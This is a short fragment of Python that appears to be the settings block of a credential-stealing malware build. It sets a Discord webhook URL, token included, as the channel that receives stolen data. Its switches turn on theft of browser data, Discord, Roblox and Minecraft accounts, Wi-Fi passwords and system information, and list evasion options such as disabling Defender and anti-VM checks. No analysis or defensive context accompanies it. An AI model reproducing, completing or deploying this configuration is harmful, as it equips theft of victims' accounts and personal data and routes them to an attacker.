...
__CONFIG__ = {'webhook': 'https://discord.com/api/webhooks/1179563887826309210/e0DC9rjPmTPblNXxWiKOfTA-YybNbJtqr14IwVhvxUXP2RCejXflTK0LKELxylW1ZNiF', 'ping': True, 'pingtype': 'Everyone', 'fakeerror': False, 'startup': False, 'defender': False, 'systeminfo': True, 'backupcodes': False, 'browser': True, 'roblox': True, 'obfuscation': False, 'injection': False, 'minecraft': True, 'wifi': True, 'killprotector': False, 'antidebug_vm': False, 'discord': True, 'anti_spam': False, 'self_destruct': False, 'clipboard': False}
